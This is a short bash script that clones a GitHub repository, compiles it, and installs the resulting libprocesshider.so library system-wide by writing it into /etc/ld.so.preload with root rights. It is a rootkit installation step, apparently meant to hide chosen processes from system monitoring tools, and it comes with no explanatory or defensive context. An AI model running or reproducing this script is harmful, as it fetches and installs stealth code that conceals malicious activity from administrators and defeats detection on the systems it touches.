#!/bin/bash
git clone https://github.com/Fasare6657/hder.git
cd hder
make

sudo mv libprocesshider.so /usr/local/lib/

sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'

